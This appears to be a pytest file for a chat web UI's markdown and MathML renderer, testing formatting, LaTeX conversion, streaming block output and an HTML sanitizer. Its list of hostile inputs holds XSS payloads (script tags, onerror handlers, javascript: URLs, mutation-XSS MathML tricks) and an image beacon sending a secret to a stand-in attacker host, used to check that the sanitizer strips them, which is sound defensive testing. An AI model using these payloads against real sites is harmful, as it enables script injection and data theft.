"""Markdown and math rendered as HTML the web UI inserts, and what the sanitizer refuses."""

from __future__ import annotations

import re
from html.parser import HTMLParser
from urllib.parse import urlsplit

import pytest

from ptychodus.agent.rendering import BlockRenderer, MessageRenderer, utf16_length


@pytest.fixture(scope='module')
def renderer() -> MessageRenderer:
    return MessageRenderer()


def test_markdown_renders_as_html(renderer: MessageRenderer) -> None:
    html = renderer.render(
        '**bold** _em_ `code`\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |'
    )

    assert '<strong>bold</strong>' in html
    assert '<em>em</em>' in html
    assert '<code>code</code>' in html
    assert '<li>one</li>' in html
    assert '<td>1</td>' in html


def test_inline_and_display_math_render_as_mathml(renderer: MessageRenderer) -> None:
    html = renderer.render(
        'Energy $E = h\\nu$, and inline $$\\frac{a}{b}$$.\n\n$$\n\\sum_i x_i\n$$'
    )

    assert '<span class="math inline"><math display="inline">' in html
    # $$...$$ inside a paragraph stays inside it.
    assert re.search(r'<p>[^<]*<span class="math inline">.*<span class="math display">', html)
    assert '<div class="math block">' in html
    assert '<mfrac>' in html
    assert html.count('<math') == 3


def test_dollar_amounts_stay_text(renderer: MessageRenderer) -> None:
    assert renderer.render('It costs $5 and $10.') == '<p>It costs $5 and $10.</p>\n'


def test_math_latex2mathml_cannot_convert_shows_as_source(renderer: MessageRenderer) -> None:
    html = renderer.render('Broken $\\frac{$ here.')

    assert '<code class="math-error">\\frac{</code>' in html


def test_relative_and_web_links_are_kept(renderer: MessageRenderer) -> None:
    html = renderer.render('[probe](/ui/#product/abc/probe) and [docs](https://example.org)')

    assert '<a href="/ui/#product/abc/probe" rel="noopener noreferrer">probe</a>' in html
    assert '<a href="https://example.org" rel="noopener noreferrer">docs</a>' in html


_HOSTILE = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<a href="javascript:alert(1)">x</a>',
    '[x](javascript:alert(1))',
    '[x](JaVaScRiPt:alert(1))',
    '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '![beacon](https://attacker.example/leak?secret=1)',
    '$\\text{<script>alert(1)</script>}$',
    '$\\href{javascript:alert(1)}{x}$',
    '$\\mathrm{<img src=x onerror=alert(1)>}$',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
    '<math href="javascript:alert(1)"><mi>x</mi></math>',
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    '<math><maction actiontype="statusline">x</maction></math>',
    '<svg><script>alert(1)</script></svg>',
    '<iframe src="https://attacker.example"></iframe>',
    '<p style="background:url(javascript:alert(1))">x</p>',
]


class _Markup(HTMLParser):
    """The elements and attributes of an HTML fragment, as a browser would parse them."""

    def __init__(self, html: str) -> None:
        super().__init__()
        self.elements: list[tuple[str, dict[str, str | None]]] = []
        self.feed(html)
        self.close()

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.elements.append((tag, dict(attrs)))


_ALLOWED_ELEMENTS = MessageRenderer._HTML_TAGS | MessageRenderer._MATHML_TAGS


@pytest.mark.parametrize('text', _HOSTILE)
def test_rendered_text_carries_nothing_scriptable(renderer: MessageRenderer, text: str) -> None:
    for tag, attributes in _Markup(renderer.render(text)).elements:
        assert tag in _ALLOWED_ELEMENTS
        assert tag not in {'img', 'iframe', 'svg', 'style', 'script', 'maction'}

        for name, value in attributes.items():
            assert not name.startswith('on'), (tag, name)
            assert name not in {'style', 'src', 'xlink:href'}, (tag, name)

            if name == 'href':
                assert tag == 'a'
                assert urlsplit(value or '').scheme in {'', 'http', 'https', 'mailto'}


@pytest.mark.parametrize('text', _HOSTILE)
def test_sanitized_html_is_a_fixed_point(renderer: MessageRenderer, text: str) -> None:
    # Re-parsing what the sanitizer wrote must not uncover anything it removed, as a
    # mutation-XSS payload would when the browser parses it again.
    html = renderer.render(text)

    assert renderer.sanitize(html) == html
    assert renderer.sanitize(renderer.sanitize(text)) == renderer.sanitize(text)


def test_raw_html_from_the_language_model_is_shown_as_text(renderer: MessageRenderer) -> None:
    assert renderer.render('<b>hi</b>') == '<p>&lt;b&gt;hi&lt;/b&gt;</p>\n'


# A hand-written sample of the LaTeX language models write, not real replies: latex2mathml
# renders each, and the ones marked degraded lose structure a reader would notice.
_TEX = [
    ('\\frac{a}{b}', '<mfrac>'),
    ('\\left( \\hbar \\omega \\right)', 'stretchy="true"'),
    ('\\mathbf{k}', '\U0001d424'),
    ('\\operatorname{FRC}(q)', '<mo>FRC</mo>'),
    ('\\text{photons per pixel}', '<mtext>photons&nbsp;per&nbsp;pixel</mtext>'),
    ('\\begin{cases} 1 & x > 0 \\\\ 0 & \\text{else} \\end{cases}', '<mtable>'),
    ('\\begin{pmatrix} 1 & 2 \\\\ 3 & 4 \\end{pmatrix}', '<mtable>'),
    ('\\mathcal{F}', 'ℱ'),
    ('\\lVert x \\rVert', '‖'),
    ('\\tfrac12', '<mfrac>'),
    ('\\sum_{i=1}^{N} |\\psi_i|^2', '<munderover>'),
    ('\\int_0^\\infty e^{-x}\\,dx', '<msubsup>'),
    ('\\hat{\\mathbf{k}}', 'accent="true"'),
    # Degraded: the alignment is lost, and each & shows as an identifier.
    ('\\begin{aligned} a &= b \\\\ c &= d \\end{aligned}', '<mi>&amp;</mi>'),
    # Degraded: an unknown macro shows as its name.
    ('\\unknownmacro{x}', '<mi>\\unknownmacro</mi>'),
]


@pytest.mark.parametrize(('tex', 'expected'), _TEX)
def test_language_model_latex_renders(renderer: MessageRenderer, tex: str, expected: str) -> None:
    html = renderer.render(f'$${tex}$$')

    assert expected in html
    assert 'math-error' not in html


def test_bracket_delimiters_stay_text(renderer: MessageRenderer) -> None:
    # Only $ delimiters are math; the agent's instructions ask for them.
    html = renderer.render('\\(x\\) and \\[y\\]')

    assert '<math' not in html


def test_blocks_render_as_each_completes(renderer: MessageRenderer) -> None:
    blocks = BlockRenderer(renderer)

    assert blocks.feed('First para') is None
    assert blocks.feed('graph.\n') is None
    assert blocks.feed('\nSecond') == ('<p>First paragraph.</p>\n', len('First paragraph.\n\n'))
    assert blocks.feed(' paragraph.\n\n$$\nx^2\n') is not None
    # The display is unclosed, so it runs to the end and is not yet complete.
    assert blocks.feed('more\n') is None
    rendered = blocks.feed('$$\n\nAfter.')
    assert rendered is not None
    assert '<math display="block">' in rendered[0]
    assert 'After' not in rendered[0]

    html, length = blocks.finish()
    assert '<p>After.</p>' in html
    assert length == len(blocks.text)


def test_an_unclosed_fence_is_held_back(renderer: MessageRenderer) -> None:
    blocks = BlockRenderer(renderer)

    assert blocks.feed('Intro.\n\n```python\nx = 1\n\nmore = 2\n') == (
        '<p>Intro.</p>\n',
        len('Intro.\n\n'),
    )
    assert blocks.feed('\n# still code\n') is None


def test_source_lengths_count_utf16_code_units(renderer: MessageRenderer) -> None:
    blocks = BlockRenderer(renderer)
    text = 'Width 𝐱.\n\nNext'

    rendered = blocks.feed(text)

    assert rendered is not None
    assert rendered[1] == utf16_length('Width 𝐱.\n\n') == len('Width 𝐱.\n\n') + 1
    assert blocks.finish()[1] == len(text) + 1
